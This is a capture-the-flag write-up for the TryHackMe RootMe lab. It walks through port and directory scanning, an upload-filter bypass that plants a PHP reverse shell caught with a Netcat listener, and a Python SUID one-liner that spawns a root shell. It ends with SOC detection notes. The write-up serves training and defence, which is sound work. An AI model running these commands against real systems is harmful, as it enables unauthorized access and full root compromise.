# TryHackMe: RootMe - CTF Writeup

A beginner-friendly Web Penetration Testing and Linux Privilege Escalation lab focused on initial access, web enumeration, reverse shell handling, and SUID exploitation.

---

## 🎯 Lab Objectives
* Perform network and port scanning using **Nmap**.
* Discover hidden web application directories using **Gobuster**.
* Bypass web application file upload filters to gain a **Reverse Shell**.
* Escalate local privileges to **Root** using misconfigured **SUID** binaries.

---

## 🛠️ Execution & Findings

### 1. Reconnaissance & Enumeration
Performed an initial service scan on the target IP:
`nmap -sV <TARGET_IP>`

* **Port 22/tcp:** Open (OpenSSH 8.2p1)
* **Port 80/tcp:** Open (Apache httpd 2.4.41)

Next, brute-forced web directories to find hidden endpoints:
`gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt`

* **Discovered Endpoints:** `/panel/` (Upload page) and `/uploads/` (Uploaded files directory).

---

### 2. Exploitation (Initial Access)
1. Navigated to `/panel/` and attempted uploading a PHP reverse shell.
2. Bypassed the `.php` file extension filter by renaming the payload to `.phtml` / `.php5`.
3. Set up a Netcat listener on the attack machine:
   `nc -lvnp 1234`
4. Executed the uploaded script via `/uploads/` to catch an active reverse shell as `www-data`.

---

### 3. Privilege Escalation
1. Enumerated all binaries on the system with **SUID** bit set:
   `find / -type f -perm -04000 -ls 2>/dev/null`
2. Identified a vulnerable **Python** SUID binary configuration.
3. Executed Python privilege escalation to spawn a root shell:
   `python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
4. Verified root access using `whoami` and retrieved `/root/root.txt`.

---

## 🛡️ Key Takeaways for SOC Analysis
* **Alert Triggers:** File upload bypasses often generate abnormal web server HTTP 200/301 status logs followed by outbound TCP connections on non-standard ports (Reverse Shell).
* **Process Monitoring:** SUID execution of interpreters (Python, Perl, Bash) by low-privilege service accounts (`www-data`) is a strong indicator of Privilege Escalation attempts.
